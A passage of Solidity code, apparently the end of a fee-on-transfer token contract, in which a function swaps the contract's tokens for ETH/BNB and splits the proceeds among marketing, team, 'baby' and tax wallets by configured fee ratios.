        lockTheSwap
    {
        // Owner provides the contract token balance
        uint256 initialBalance = address(this).balance;
        // swap the tokens to ETH/BNB
        swapTokensForEth(contractBalance);
        uint256 balAfter = address(this).balance;
        uint256 workingBal = balAfter.sub(initialBalance);
        // To determine the rate of division of BNB, change the buy fees before calling this fxn .
        uint256 _marketingFee = workingBal.mul(buyMarketingFee).div(
            dexBuyFeeTotal
        );
        payable(marketingWallet).transfer(_marketingFee);

        uint256 _sPFee = workingBal.mul(buybabyFee).div(dexBuyFeeTotal);
        payable(babyWallet).transfer(_sPFee);

        uint256 _teamFee = workingBal.mul(buyTeamFee).div(dexBuyFeeTotal);
        payable(TeamWallet).transfer(_teamFee);

        uint256 _LpFee = workingBal.mul(buyLpFee).div(dexBuyFeeTotal);
        payable(taxAddress).transfer(_LpFee);
        accumulatedBuyFees = 0;
        accumulatedSellFees = 0;
    }
}